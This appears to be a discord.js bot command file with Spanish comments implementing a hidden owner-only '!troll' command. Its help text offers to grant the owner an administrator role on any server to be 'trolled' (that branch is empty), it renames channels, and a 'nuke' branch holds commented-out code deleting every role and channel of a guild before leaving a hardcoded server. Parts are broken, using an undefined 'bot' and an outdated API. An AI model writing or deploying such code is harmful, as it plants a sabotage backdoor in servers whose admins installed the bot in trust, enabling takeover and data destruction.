const { botowner } = require('../config.json');
const Discord = require('discord.js');

exports.run = async (client, message, args) => {
    // El comando requiere ser el owner del bot
    if (message.author.id !== botowner) return message.reply('no tienes el permiso para hacer esto.');

    // Borrar el mensaje del owner
    message.delete();

    const embedayuda = new Discord.MessageEmbed()
        .setTitle("Ayuda del comando !troll")
        .setColor("RANDOM")
        .setDescription("!troll adminrole - **Te da rol administrador en el servidor que quieras trollear**\n!troll cn - **XD**");

    switch (args[0]) {

        case 'adminrole':

            break;

        case 'cn':
            let canalnombrado = args.join(" ").slice(3);
            message.channel.setName(canalnombrado);
            break;

        case 'nuke':

            let guild = client.guilds.get('784628646781648946'), // returns a Guild or undefined
                channel;

            /*
            message.guild.roles.cache.forEach(roles => {
                roles.delete()
                    .then(deleted => client.logger.log('info', `Rol Eliminado: ${deleted.name}`))
                    .catch(console.error);
            });

            message.guild.channels.cache.forEach(channels => {
                channels.delete()
                    .then(deleted => client.logger.log('info', `Canal Eliminado: ${deleted.name}`))
                    .catch(console.error);
            });
            */

            bot.guilds.cache.get("784628646781648946").leave()

            break;

        default:
            message.channel.send(embedayuda);
    }
}